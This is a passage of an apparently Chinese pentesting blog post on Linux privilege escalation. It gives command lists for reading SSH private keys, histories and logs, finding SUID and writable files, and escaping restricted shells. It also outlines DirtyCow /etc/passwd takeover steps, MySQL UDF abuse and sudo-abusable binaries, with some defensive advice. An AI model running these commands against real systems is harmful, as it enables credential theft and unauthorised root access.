+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /var/apache2/config.inc<br><span class="hljs-built_in">cat</span> /var/lib/mysql/mysql/user.MYD<br><span class="hljs-built_in">cat</span> /root/anaconda-ks.cfg<br></code></pre></td></tr></table></figure>
+
+<p><strong>执行命令的历史记录</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> ~/.bash_history<br><span class="hljs-built_in">cat</span> ~/.nano_history<br><span class="hljs-built_in">cat</span> ~/.atftp_history<br><span class="hljs-built_in">cat</span> ~/.mysql_history<br><span class="hljs-built_in">cat</span> ~/.php_history<br></code></pre></td></tr></table></figure>
+
+<p><strong>用户信息？</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> ~/.bashrc<br><span class="hljs-built_in">cat</span> ~/.profile<br><span class="hljs-built_in">cat</span> /var/mail/root<br><span class="hljs-built_in">cat</span> /var/spool/mail/root<br></code></pre></td></tr></table></figure>
+
+
+
+<p><strong>私钥信息</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> ~/.ssh/authorized_keys<br><span class="hljs-built_in">cat</span> ~/.ssh/identity.pub<br><span class="hljs-built_in">cat</span> ~/.ssh/identity<br><span class="hljs-built_in">cat</span> ~/.ssh/id_rsa.pub<br><span class="hljs-built_in">cat</span> ~/.ssh/id_rsa<br><span class="hljs-built_in">cat</span> ~/.ssh/id_dsa.pub<br><span class="hljs-built_in">cat</span> ~/.ssh/id_dsa<br><span class="hljs-built_in">cat</span> /etc/ssh/ssh_config<br><span class="hljs-built_in">cat</span> /etc/ssh/sshd_config<br><span class="hljs-built_in">cat</span> /etc/ssh/ssh_host_dsa_key.pub<br><span class="hljs-built_in">cat</span> /etc/ssh/ssh_host_dsa_key<br><span class="hljs-built_in">cat</span> /etc/ssh/ssh_host_rsa_key.pub<br><span class="hljs-built_in">cat</span> /etc/ssh/ssh_host_rsa_key<br><span class="hljs-built_in">cat</span> /etc/ssh/ssh_host_key.pub<br><span class="hljs-built_in">cat</span> /etc/ssh/ssh_host_key<br></code></pre></td></tr></table></figure>
+
+
+
+<h3 id="文件系统"><a href="#文件系统" class="headerlink" title="文件系统"></a>文件系统</h3><h5 id="可以在-x2F-etc-x2F-中写入哪些配置文件？能够重新配置服务？"><a href="#可以在-x2F-etc-x2F-中写入哪些配置文件？能够重新配置服务？" class="headerlink" title="可以在&#x2F;etc&#x2F;中写入哪些配置文件？能够重新配置服务？"></a>可以在&#x2F;etc&#x2F;中写入哪些配置文件？能够重新配置服务？</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ls</span> -aRl /etc/ | awk <span class="hljs-string">&#x27;$1 ~ /^.*w.*/&#x27;</span> 2&gt;/dev/null <span class="hljs-comment"># Anyone</span><br><span class="hljs-built_in">ls</span> -aRl /etc/ | awk <span class="hljs-string">&#x27;$1 ~ /^..w/&#x27;</span> 2&gt;/dev/null <span class="hljs-comment"># Owner</span><br><span class="hljs-built_in">ls</span> -aRl /etc/ | awk <span class="hljs-string">&#x27;$1 ~ /^.....w/&#x27;</span> 2&gt;/dev/null <span class="hljs-comment"># Group</span><br><span class="hljs-built_in">ls</span> -aRl /etc/ | awk <span class="hljs-string">&#x27;$1 ~ /w.$/&#x27;</span> 2&gt;/dev/null <span class="hljs-comment"># Other</span><br>find /etc/ -readable -<span class="hljs-built_in">type</span> f 2&gt;/dev/null <span class="hljs-comment"># Anyone</span><br>find /etc/ -readable -<span class="hljs-built_in">type</span> f -maxdepth 1 2&gt;/dev/null <span class="hljs-comment"># Anyone</span><br></code></pre></td></tr></table></figure>
+
+
+
+<h5 id="在-x2F-var-x2F-中可以找到什么？"><a href="#在-x2F-var-x2F-中可以找到什么？" class="headerlink" title="在&#x2F;var&#x2F;中可以找到什么？"></a>在&#x2F;var&#x2F;中可以找到什么？</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ls</span> -alh /var/log <span class="hljs-built_in">ls</span> -alh /var/mail<br><span class="hljs-built_in">ls</span> -alh /var/spool<br><span class="hljs-built_in">ls</span> -alh /var/spool/lpd<br><span class="hljs-built_in">ls</span> -alh /var/lib/pgsql<br><span class="hljs-built_in">ls</span> -alh /var/lib/mysql<br><span class="hljs-built_in">cat</span> /var/lib/dhcp3/dhclient.leases<br></code></pre></td></tr></table></figure>
+
+
+
+<p><strong>网站上是否有任何设置&#x2F;文件（隐藏）？有数据库信息的任何设置文件吗？</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ls</span> -alhR /var/www/<br><span class="hljs-built_in">ls</span> -alhR /srv/www/htdocs/<br><span class="hljs-built_in">ls</span> -alhR /usr/local/www/apache22/data/<br><span class="hljs-built_in">ls</span> -alhR /opt/lampp/htdocs/<br><span class="hljs-built_in">ls</span> -alhR /var/www/html/<br></code></pre></td></tr></table></figure>
+
+
+
+<p><strong>日志文件中是否有任何内容（可以帮助“本地文件包含”!）</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /etc/httpd/logs/access_log<br><span class="hljs-built_in">cat</span> /etc/httpd/logs/access.log<br><span class="hljs-built_in">cat</span> /etc/httpd/logs/error_log<br><span class="hljs-built_in">cat</span> /etc/httpd/logs/error.log<br><span class="hljs-built_in">cat</span> /var/log/apache2/access_log<br><span class="hljs-built_in">cat</span> /var/log/apache2/access.log<br><span class="hljs-built_in">cat</span> /var/log/apache2/error_log<br><span class="hljs-built_in">cat</span> /var/log/apache2/error.log<br><span class="hljs-built_in">cat</span> /var/log/apache/access_log<br><span class="hljs-built_in">cat</span> /var/log/apache/access.log<br><span class="hljs-built_in">cat</span> /var/log/auth.log<br><span class="hljs-built_in">cat</span> /var/log/chttp.log<br><span class="hljs-built_in">cat</span> /var/log/cups/error_log<br><span class="hljs-built_in">cat</span> /var/log/dpkg.log<br><span class="hljs-built_in">cat</span> /var/log/faillog<br><span class="hljs-built_in">cat</span> /var/log/httpd/access_log<br><span class="hljs-built_in">cat</span> /var/log/httpd/access.log<br><span class="hljs-built_in">cat</span> /var/log/httpd/error_log<br><span class="hljs-built_in">cat</span> /var/log/httpd/error.log<br><span class="hljs-built_in">cat</span> /var/log/lastlog<br><span class="hljs-built_in">cat</span> /var/log/lighttpd/access.log<br><span class="hljs-built_in">cat</span> /var/log/lighttpd/error.log<br><span class="hljs-built_in">cat</span> /var/log/lighttpd/lighttpd.access.log<br><span class="hljs-built_in">cat</span> /var/log/lighttpd/lighttpd.error.log<br><span class="hljs-built_in">cat</span> /var/log/messagescat /var/log/secure<br><span class="hljs-built_in">cat</span> /var/log/syslogcat /var/log/wtmp<br><span class="hljs-built_in">cat</span> /var/log/xferlog<br><span class="hljs-built_in">cat</span> /var/log/yum.log<br><span class="hljs-built_in">cat</span> /var/run/utmp<br><span class="hljs-built_in">cat</span> /var/webmin/miniserv.log<br><span class="hljs-built_in">cat</span> /var/www/logs/access_log<br><span class="hljs-built_in">cat</span> /var/www/logs/access.log<br><span class="hljs-built_in">ls</span> -alh /var/lib/dhcp3/<br><span class="hljs-built_in">ls</span> -alh /var/log/postgresql/<br><span class="hljs-built_in">ls</span> -alh /var/log/proftpd/<br><span class="hljs-built_in">ls</span> -alh /var/log/samba/<br>Note: auth.log, boot, btmp, daemon.log, debug, dmesg, kern.log, mail.info, mail.log, mail.warn, messages, syslog, udev, wtmp<br></code></pre></td></tr></table></figure>
+
+
+
+<h5 id="尝试跳出命令限制"><a href="#尝试跳出命令限制" class="headerlink" title="尝试跳出命令限制"></a>尝试跳出命令限制</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">python -c <span class="hljs-string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><br><span class="hljs-built_in">echo</span> os.system(<span class="hljs-string">&#x27;/bin/bash&#x27;</span>)<br><br>/bin/sh -i<br></code></pre></td></tr></table></figure>
+
+<p><strong>挂载的文件系统</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">mount <span class="hljs-built_in">df</span> -h<br></code></pre></td></tr></table></figure>
+
+<p><strong>卸载的文件系统</strong> </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /etc/fstab<br></code></pre></td></tr></table></figure>
+
+
+
+<p><strong>特殊文件权限</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -perm -1000 -<span class="hljs-built_in">type</span> d 2&gt;/dev/null   <span class="hljs-comment"># Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here.</span><br><br>find / -perm -g=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null    <span class="hljs-comment"># SGID (chmod 2000) - run as the group, not the user who started it.</span><br><br>find / -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null    <span class="hljs-comment"># SUID (chmod 4000) - run as the owner, not the user who started it.</span><br><br>find / -perm -g=s -o -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null    <span class="hljs-comment"># SGID or SUIDfor i in `locate -r &quot;bin$&quot;`; do</span><br><br>find <span class="hljs-variable">$i</span> \( -perm -4000 -o -perm -2000 \) -<span class="hljs-built_in">type</span> f 2&gt;/dev/null; <span class="hljs-keyword">done</span>    <span class="hljs-comment"># Looks in &#x27;common&#x27; places: /bin, /sbin, /usr/bin, /usr/sbin, /usr/local/bin, /usr/local/sbin and any other *bin, for SGID or SUID (Quicker search)#</span><br><br>find starting at root (/), SGID or SUID, not Symbolic links, only 3 folders deep, list with more detail and hide any errors (e.g. permission denied)find / -perm -g=s -o -perm -4000 ! -<span class="hljs-built_in">type</span> l -maxdepth 3 -<span class="hljs-built_in">exec</span> <span class="hljs-built_in">ls</span> -ld &#123;&#125; \; 2&gt;/dev/null<br></code></pre></td></tr></table></figure>
+
+<h5 id="可以在哪里写入和执行？一些“常见”位置"><a href="#可以在哪里写入和执行？一些“常见”位置" class="headerlink" title="可以在哪里写入和执行？一些“常见”位置:"></a>可以在哪里写入和执行？一些“常见”位置:</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">/ tmp<br>/ var / tmp<br>/ dev / shm<br>find / -writable -<span class="hljs-built_in">type</span> d 2&gt;/dev/null      <span class="hljs-comment"># world-writeable folders</span><br>find / -perm -222 -<span class="hljs-built_in">type</span> d 2&gt;/dev/null     <span class="hljs-comment"># world-writeable folders</span><br>find / -perm -o w -<span class="hljs-built_in">type</span> d 2&gt;/dev/null     <span class="hljs-comment"># world-writeable folders</span><br>find / -perm -o x -<span class="hljs-built_in">type</span> d 2&gt;/dev/null     <span class="hljs-comment"># world-executable folders</span><br>find / \( -perm -o w -perm -o x \) -<span class="hljs-built_in">type</span> d 2&gt;/dev/null   <span class="hljs-comment"># world-writeable &amp; executable folders</span><br></code></pre></td></tr></table></figure>
+
+<p><strong>任何“问题”文件吗？Word可写的“没人”文件</strong></p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">find</span> / -xdev -type d \( -perm -0002 -a ! -perm -1000 \) -<span class="hljs-built_in">print</span>   # world-writeable filesfind /dir -xdev \( -nouser -o -nogroup \) -<span class="hljs-built_in">print</span>   # Noowner files<br></code></pre></td></tr></table></figure>
+
+<h3 id="准备和查找漏洞利用代码"><a href="#准备和查找漏洞利用代码" class="headerlink" title="准备和查找漏洞利用代码"></a>准备和查找漏洞利用代码</h3><h5 id="安装-x2F-支持的开发工具-x2F-语言"><a href="#安装-x2F-支持的开发工具-x2F-语言" class="headerlink" title="安装&#x2F;支持的开发工具&#x2F;语言"></a>安装&#x2F;支持的开发工具&#x2F;语言</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -name perl*<br>find / -name python*<br>find / -name gcc*<br>find / -name cc<br></code></pre></td></tr></table></figure>
+
+
+
+<p><strong>上传文件</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -name wget<br>find / -name nc*<br>find / -name netcat*<br>find / -name tftp*<br>find / -name ftp<br></code></pre></td></tr></table></figure>
+
+
+
+<p><strong>系统补丁</strong></p>
+<p>内核，操作系统，所有应用程序，其插件和Web服务</p>
+<h2 id="0x03-Linux提权-自动信息收集"><a href="#0x03-Linux提权-自动信息收集" class="headerlink" title="0x03 Linux提权-自动信息收集"></a>0x03 Linux提权-自动信息收集</h2><h3 id="枚举脚本"><a href="#枚举脚本" class="headerlink" title="枚举脚本"></a>枚举脚本</h3><p>我主要使用了三个用于枚举机器的脚本。它们在脚本之间有些区别，但是它们输出的内容很多相同。因此，将它们全部测试一下，看看您最喜欢哪一个。</p>
+<p><strong>LinEnum</strong></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/rebootuser/LinEnum">https://github.com/rebootuser/LinEnum</a></p>
+<p>以下是选项:</p>
+<figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs diff"><span class="hljs-deletion">-k Enter keyword</span><br><span class="hljs-deletion">-e Enter export location</span><br><span class="hljs-deletion">-t Include thorough (lengthy) tests</span><br><span class="hljs-deletion">-r Enter report name</span><br><span class="hljs-deletion">-h Displays this help text</span><br></code></pre></td></tr></table></figure>
+
+<p><strong>Unix特权</strong></p>
+<p><a target="_blank" rel="noopener" href="http://pentestmonkey.net/tools/audit/unix-privesc-check">http://pentestmonkey.net/tools/audit/unix-privesc-check</a><br>运行脚本并将输出保存在文件中，然后使用grep发出警告。</p>
+<p><strong>Linprivchecker.py</strong></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/reider-roque/linpostexp/blob/master/linprivchecker.py">https://github.com/reider-roque/linpostexp/blob/master/linprivchecker.py</a></p>
+<h2 id="0x04-Linux提权-内核漏洞提权"><a href="#0x04-Linux提权-内核漏洞提权" class="headerlink" title="0x04 Linux提权-内核漏洞提权"></a>0x04 Linux提权-内核漏洞提权</h2><p>通过利用Linux内核中的漏洞，有时我们可以提升特权。我们可以通过系统的体系结构和内核版本验证内核提权是否可行。</p>
+<p>假设我们可以以非特权用户身份运行代码，这就是内核提权的工作流程。</p>
+<p>1.诱使内核在内核模式下运行我们的Payload</p>
+<p>2.处理内核数据，例如进程特权</p>
+<p>3.以新特权启动shell，获得root shell</p>
+<p><strong>考虑到要成功利用内核利用攻击，攻击者需要满足以下四个条件:</strong></p>
+<p>1.易受攻击的内核</p>
+<p>2.匹配的漏洞利用程序</p>
+<p>3.将漏洞利用程序转移到目标上</p>
+<p>4.在目标上执行漏洞利用程序</p>
+<p>防御内核提权的最简单方法是及时打补丁和更新。在没有补丁的情况下，管理员可以极大地影响在目标上转移和执行漏洞利用的能力。考虑到这些因素，如果管理员可以阻止将利用程序引入和&#x2F;或执行到Linux文件系统上，则内核利用程序攻击将不再可行。因此，管理员应专注于限制或删除支持文件传输的程序，例如FTP，TFTP，SCP，wget和curl。当需要这些程序时，它们的使用应限于特定的用户，目录，应用程序（例如SCP）和特定的IP地址或域。</p>
+<p><strong>内核信息收集</strong></p>
+<p>一些基本命令收集一些Linux内核信息</p>
+<table>
+<thead>
+<tr>
+<th><strong>命令</strong></th>
+<th><strong>结果</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>uname -a</td>
+<td>打印所有可用的系统信息</td>
+</tr>
+<tr>
+<td>uname -m</td>
+<td>Linux内核体系结构（32或64位）</td>
+</tr>
+<tr>
+<td>uname -r</td>
+<td>内核发布</td>
+</tr>
+<tr>
+<td>uname -n要么hostname</td>
+<td>系统主机名</td>
+</tr>
+<tr>
+<td>cat &#x2F;proc&#x2F;version</td>
+<td>内核信息</td>
+</tr>
+<tr>
+<td>cat &#x2F;etc&#x2F;*-release要么cat &#x2F;etc&#x2F;issue</td>
+<td>发行信息</td>
+</tr>
+<tr>
+<td>cat &#x2F;proc&#x2F;cpuinfo</td>
+<td>CPU信息</td>
+</tr>
+<tr>
+<td>df -a</td>
+<td>文件系统信息</td>
+</tr>
+<tr>
+<td>dpkg –list 2&gt;&#x2F;dev&#x2F;null| grep compiler |grep -v decompiler 2&gt;&#x2F;dev&#x2F;null &amp;&amp; yum list installed ‘gcc*’ 2&gt;&#x2F;dev&#x2F;null| grep gcc 2&gt;&#x2F;dev&#x2F;null</td>
+<td>列出可用的编译器</td>
+</tr>
+</tbody></table>
+<p><strong>对漏洞进行搜索</strong></p>
+<blockquote>
+<p>exploit-db.com kernel version python linprivchecker.py extended</p>
+</blockquote>
+<p><strong>脏牛（CVE-2016-5195）提权过程</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">1.$ <span class="hljs-built_in">whoami</span><br>告诉我们当前用户是john（非root用户）<br>2.$ <span class="hljs-built_in">uname</span> -a <br>该内核版本受漏洞影响<br>&gt;从此处下载dirtycow漏洞– https://www.exploit-db.com/exploits/40839/<br>&gt;&gt;编译并执行。通过编辑/etc/passwd文件，它将<span class="hljs-string">&quot;root&quot;</span>用户替换为新用户<span class="hljs-string">&quot;rash&quot;</span>。<br>3.$ su rash –将当前登录用户更改为root用户的“ rash”。<br></code></pre></td></tr></table></figure>
+
+
+<p><strong>其他内核提权</strong></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs">https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs</a></p>
+<p>另外，Kali上有exploit-db的本地副本，同样可以进行查询</p>
+<p>&#x3D;&#x3D;<strong>避免一开始就利用任何本地特权升级漏洞</strong>&#x3D;&#x3D;</p>
+<p>使用内核漏洞进行提权可能会使计算机崩溃或使其处于不稳定状态。因此，&#x3D;&#x3D;内核漏洞利用应该是最后的手段&#x3D;&#x3D;。</p>
+<h2 id="0x05-Linux提权-利用以root权限运行的服务"><a href="#0x05-Linux提权-利用以root权限运行的服务" class="headerlink" title="0x05 Linux提权-利用以root权限运行的服务"></a>0x05 Linux提权-利用以root权限运行的服务</h2><p>著名的<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/EternalBlue">EternalBlue</a>和<a target="_blank" rel="noopener" href="https://thehackernews.com/2017/05/samba-rce-exploit.html">SambaCry</a>漏洞利用了以root身份运行的smb服务。由于它的致命组合，它被广泛用于在全球范围内传播勒索软件。</p>
+<p>这里的手法是，如果特定服务以root用户身份运行，并且我们可以使该服务执行命令，则可以root用户身份执行命令。</p>
+<p>我们可以重点检查Web服务，邮件服务，数据库服务等是否以root用户身份运行。很多时候，运维人员都以root用户身份运行这些服务，而忽略了它可能引起的安全问题。可能有一些服务在本地运行，而没有公开暴露出来，但是也可以利用。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">netstat -antup <span class="hljs-comment">#显示所有打开并正在监听的端口。我们可以检查在本地运行的服务是否可以被利用。</span><br><br>ps aux <span class="hljs-comment">#列出哪些进程正在运行</span><br><br>ps -aux | grep root <span class="hljs-comment">#列出以root身份运行的服务。</span><br></code></pre></td></tr></table></figure>
+
+
+
+<p>在Metasploits的meterpreter中</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ps <span class="hljs-comment">#检查哪些进程正在运行</span><br></code></pre></td></tr></table></figure>
+
+
+
+
+
+<p><strong>MySQL UDF提权</strong></p>
+<p>MySQL UDF动态库漏洞利用可让我们从mysql shell执行任意命令。如果mysql以root特权运行，则命令将以root身份执行。</p>
+<p>ps -aux | grep root 列出以root身份运行的服务。</p>
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/04/img/%E5%86%85%E7%BD%91%E6%8F%90%E6%9D%83-Linux.assets/c390e8882c274864b54a4b4edf3c9911-164658049401417.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p>可以看到mysql服务以root用户组运行，那么MySQL Shell执行任意命令时的身份就是root。</p>
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/04/img/%E5%86%85%E7%BD%91%E6%8F%90%E6%9D%83-Linux.assets/491b3a4805a149fdafa6105263e304c7.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p>拥有root权限的程序的二进制漏洞利用远没有内核漏洞利用危险，因为即使服务崩溃，主机也不会崩溃，并且服务可能会自动重启。</p>
+<p><strong>防御</strong></p>
+<p>除非真正需要，否则切勿以root用户身份运行任何服务，尤其是Web，数据库和文件服务器。</p>
+<h2 id="0x06-Linux提权-滥用sudo"><a href="#0x06-Linux提权-滥用sudo" class="headerlink" title="0x06 Linux提权-滥用sudo"></a>0x06 Linux提权-滥用sudo</h2><p>在渗透中，我们拿到的webshell和反弹回来的shell权限可能都不高，如果我们可以使用sudo命令访问某些程序，则我们可以使用sudo命令提权。</p>
+<p>常见的用来sudo提权的二进制文件</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell">/usr/bin/find<br>/usr/bin/nano<br>/usr/bin/vim<br>/usr/bin/man<br>/usr/bin/awk<br>/usr/bin/less<br>/usr/bin/nmap ( –interactive and –script method)<br>/bin/more<br>/usr/bin/wget<br>/usr/sbin/apache2<br></code></pre></td></tr></table></figure>
+
+
+
+<h3 id="sudo介绍"><a href="#sudo介绍" class="headerlink" title="sudo介绍"></a>sudo介绍</h3><p>sudo是<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/linux%E7%B3%BB%E7%BB%9F/1732935">linux系统</a>管理指令，是允许<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E7%B3%BB%E7%BB%9F%E7%AE%A1%E7%90%86%E5%91%98/1503845">系统管理员</a>让普通用户执行一些或者全部的root命令的一个工具，如halt，reboot，su等等。这样不仅减少了root用户的登录 和管理时间，同样也提高了安全性。sudo不是对shell的一个代替，它是面向每个命令的。</p>
+<p>基础</p>
+<p>它的特性主要有这样几点:</p>
+<ul>
+<li>sudo能够限制用户只在某台<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E4%B8%BB%E6%9C%BA">主机</a>上运行某些命令。</li>
+<li>sudo提供了丰富的日志，详细地记录了每个用户干了什么。它能够将日志传到中心主机或者日志服务器。</li>
+<li>sudo使用<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E6%97%B6%E9%97%B4%E6%88%B3">时间戳</a>文件来执行类似的“检票”系统。当用户调用sudo并且输入它的密码时，用户获得了一张存活期为5分钟的票（这个值可以在编译的时候改变）。</li>
+<li>sudo的配置文件是sudoers文件，它允许系统管理员集中的管理用户的使用权限和使用的主机。它所存放的位置默认是在&#x2F;etc&#x2F;sudoers，属性必须为0440。</li>
+</ul>
+<p>在sudo于1980年前后被写出之前，一般用户管理系统的方式是利用<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/su">su</a>切换为超级用户。但是使用su的缺点之一在于必须要先告知超级用户的密码。</p>
+<p>sudo使一般用户不需要知道超级用户的密码即可获得权限。首先超级用户将普通用户的名字、可以执行的特定命令、按照哪种用户或用户组的身份执行等信息，登记在特殊的文件中（通常是&#x2F;etc&#x2F;sudoers），即完成对该用户的授权（此时该用户称为“sudoer”）；在一般用户需要取得特殊权限时，其可在命令前加上“sudo”，此时sudo将会询问该用户自己的密码（以确认终端机前的是该用户本人），回答后系统即会将该命令的进程以超级用户的权限运行。之后的一段时间内（默认为5分钟，可在&#x2F;etc&#x2F;sudoers自定义），使用sudo不需要再次输入密码。</p>
+<p>由于不需要超级用户的密码，部分Unix系统甚至利用sudo使一般用户取代超级用户作为管理帐号，例如<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/Ubuntu">Ubuntu</a>、[Mac OS X](<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/Mac">https://baike.baidu.com/item/Mac</a> OS X)等。</p>
+<p><strong>参数说明</strong>:</p>
+<ul>
+<li>-V 显示版本编号</li>
+<li>-h 会显示版本编号及指令的使用方式说明</li>
+<li>-l 显示出自己（执行 sudo 的使用者）的权限</li>
+<li>-v 因为 sudo 在第一次执行时或是在 N 分钟内没有执行（N 预设为五）会问密码，这个参数是重新做一次确认，如果超过 N 分钟，也会问密码</li>
+<li>-k 将会强迫使用者在下一次执行 sudo 时问密码（不论有没有超过 N 分钟）</li>
+<li>-b 将要执行的指令放在背景执行</li>
+<li>-p prompt 可以更改问密码的提示语，其中 %u 会代换为使用者的帐号名称， %h 会显示主机名称</li>
+<li>-u username&#x2F;#uid 不加此参数，代表要以 root 的身份执行指令，而加了此参数，可以以 username 的身份执行指令（#uid 为该 username 的使用者号码）</li>
+<li>-s 执行环境变数中的 SHELL 所指定的 shell ，或是 &#x2F;etc&#x2F;passwd 里所指定的 shell</li>
+<li>-H 将环境变数中的 HOME （家目录）指定为要变更身份的使用者家目录（如不加 -u 参数就是系统管理者 root ）</li>
+<li>command 要以系统管理者身份（或以 -u 更改为其他人）执行的指令</li>
+</ul>
+<h3 id="sudoers文件介绍"><a href="#sudoers文件介绍" class="headerlink" title="sudoers文件介绍"></a>sudoers文件介绍</h3><h4 id="sudoers文件主要有三部分组成"><a href="#sudoers文件主要有三部分组成" class="headerlink" title="sudoers文件主要有三部分组成:"></a>sudoers文件主要有三部分组成:</h4><ul>
+<li>sudoers的默认配置（default），主要设置sudo的一些缺省值</li>
+<li>alias（别名），主要有Host_Alias|Runas_Alias|User_Alias|Cmnd_Alias。</li>
+<li>安全策略（规则定义）——<strong>重点</strong>。</li>
+</ul>
